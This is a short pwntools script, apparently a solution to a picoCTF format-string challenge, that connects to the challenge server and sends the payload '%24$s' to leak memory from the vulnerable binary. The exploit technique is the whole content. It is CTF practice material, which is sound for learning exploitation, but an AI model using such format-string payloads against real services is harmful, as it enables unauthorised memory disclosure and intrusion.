from pwn import * 

exe = ELF("./vuln")

context.binary = exe
def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("saturn.picoctf.net", 56787)

    return r

def main():
	r = conn()
	input()
	
	fmt_str = b'%24$s'
	r.sendlineafter(b'I\'ll tell you one >> ', fmt_str)
	# pause()
	# r.recvuntil(b'Here\'s a story - \n')
	# pause()
	r.interactive()
if __name__ == "__main__":
	main()